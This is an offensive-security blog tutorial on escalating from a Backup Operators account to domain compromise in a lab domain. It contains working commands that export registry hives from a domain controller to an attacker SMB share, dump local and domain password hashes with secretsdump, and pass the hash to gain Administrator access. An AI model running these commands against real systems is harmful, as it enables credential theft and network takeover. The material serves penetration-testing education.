---
title: Domain Escalation – Backup Operator
url: http://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/
source: Over Security - Cybersecurity news aggregator
date: 2025-05-03
fetch_date: 2025-10-06T22:28:25.865690
---

# Domain Escalation – Backup Operator

[Skip to content](#content)

[Penetration Testing Lab](https://pentestlab.blog/)

Offensive Techniques & Methodologies

Menu

* [Methodologies](https://pentestlab.blog/methodologies/)
  + [Red Teaming](https://pentestlab.blog/methodologies/red-teaming/)
    - [Credential Access](https://pentestlab.blog/methodologies/red-teaming/credential-access/)
    - [Persistence](https://pentestlab.blog/methodologies/red-teaming/persistence/)
* [Resources](https://pentestlab.blog/resources/)
  + [Papers](https://pentestlab.blog/resources/papers/)
    - [Web Application](https://pentestlab.blog/resources/papers/web-application/)
  + [Presentations](https://pentestlab.blog/resources/presentations/)
    - [Defcon](https://pentestlab.blog/resources/presentations/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/presentations/derbycon/)
    - [Tools](https://pentestlab.blog/resources/presentations/tools/)
  + [Videos](https://pentestlab.blog/resources/videos/)
    - [BSides](https://pentestlab.blog/resources/videos/bsides/)
    - [Defcon](https://pentestlab.blog/resources/videos/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/videos/derbycon/)
    - [Hack In Paris](https://pentestlab.blog/resources/videos/hack-in-paris/)
* [Contact](https://pentestlab.blog/contact-the-lab/)
  + [About Us](https://pentestlab.blog/contact-the-lab/about-us/)

Posted on [January 22, 2024January 14, 2024](https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/)

# Domain Escalation – Backup Operator

![Unknown's avatar](https://0.gravatar.com/avatar/9161b274d6d350683293f1e03d228985ac0ff6ac6c89353f4b6bd1a7bc69daf4?s=32&d=identicon&r=G) by [Administrator](https://pentestlab.blog/author/worm1984/).In [Domain Escalation](https://pentestlab.blog/category/red-team/domain-escalation/).[1 Comment on Domain Escalation – Backup Operator](https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/#comments)

The Backup Operators is a Windows built-in group. Users which are part of this group have permissions to perform backup and restore operations. More specifically, these users have the *SeBackupPrivilege* assigned which enables them to read sensitive files from the domain controller i.e. Security Account Manager (SAM).

In the event that a user which has the *SeBackupPrivilege* permission is compromised during red team operations this can provide a direct route to compromise the domain. Since this privilege has the permission to read and retrieve sensitive hives from the domain controller such as SAM, SECURITY and SYSTEM which There are multiple proof of concepts which have been disclosed publicly and can be utilized from different perspective to perform domain escalation i.e. implant, PowerShell, non-domain joined etc.

## Implant

It is trivial to identify the user group membership by executing the command below:

```
shell net user peter /domain
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-user-havoc.png?w=942)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-user-havoc.png)

Backup Operator Privilege

It should be noted that the *SeBackupPrivilege* it is not enabled by default even though the user is part of the Backup Operators group. Typically, this privilege is obtained when the implant is running from an elevated (it should not be confused with local administrator privileges) session using the credentials of the Backup Operator user. Executing the command below will obtain group and privilege information.

```
whoami /all
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-whoami.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-whoami.png)

Backup Operator – whoami /all

A .NET assembly has implemented by [snovvcrash](https://twitter.com/snovvcrash) called [RegSave](https://github.com/snovvcrash/RemoteRegSave) which enables red team operators to conduct the technique via an implant. The tool can perform Active Directory enumeration to identify which groups have permissions over the registry.

```
dotnet inline-execute /home/kali/RegSave.exe -t dc.red.lab --acl
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-regsave-access-control-list.png?w=936)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-regsave-access-control-list.png)

RegSave – Access Control List

Using the *–backup* flag will export the registry hives into a readable and accessible location in the domain controller. These files could be retrieved for an offline analysis with Impacket.

```
dotnet inline-execute /home/kali/RegSave.exe -t dc.red.lab -o C:\Windows\SYSVOL\sysvol\red.lab\scripts --backup
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-regsave.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-regsave.png)

RegSave

Verification that these files are accessible is feasible by executing the following command from the implant.

```
dir \\10.0.0.1\C$\Windows\SYSVOL\sysvol\red.lab\scripts
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-list-files-dc.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-list-files-dc.png)

List Hives DC

An alternative approach would be to dump the SAM, SECURITY and SYSTEM hives into a UNC share. The *smbserver* from impacket suite can set up a simple SMB server:

```
impacket-smbserver -smb2support share /tmp/share
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-smb-share.png?w=624)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-smb-share.png)

SMB Share

The [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) is a proof of concept written in C++ which can target domain controllers using an account which is part of the Backup Operators group. The proof of concept can export the registry hives into *C:\temp* path or into a UNC share.

```
BackupOperatorToDA.exe -t \\dc.red.lab -u peter -p Password123 -d red.lab -o //10.0.0.3/share/
BackupOperatorToDA.exe -t \\dc.red.lab -u peter -p Password123 -d red.lab -o C:\temp
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-backupoperatortoda.png?w=932)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-backupoperatortoda.png)

BackupOperatorToDA

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-sam-hive.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-sam-hive.png)

SAM Hive

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-unc-share.png?w=648)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-unc-share.png)

UNC Share – SAM Hive

Using the exported files *secretsdump* from Impacket can decrypt the contents of the SAM registry hive into order to dump local hashes of the domain controller.

```
impacket-secretsdump -sam /tmp/share/SAM -system /tmp/share/SYSTEM -security /tmp/share/SECURITY LOCAL
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-dump-hashes.png?w=620)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-dump-hashes.png)

Dump Domain Hashes

Using the hash of the domain controller machine account it is feasible also to dump all the domain hashes.

```
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:73ba6ef0d8ae6a755fc118e8df6540f7 -just-dc red/dc\$@10.0.0.1
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-dump-domain-hashes.png?w=634)](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-dump-domain-hashes.png)

Dump Domain Hashes

Using the password hash of the domain administrator it is possible to access the domain controller directly using a WMI connection.

```
impacket-wmiexec Administrator@10.0.0.1 -hashes ':58a478135a93ac3bf058a5ea0e8fdb71'
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/backup-operator-wmiexec...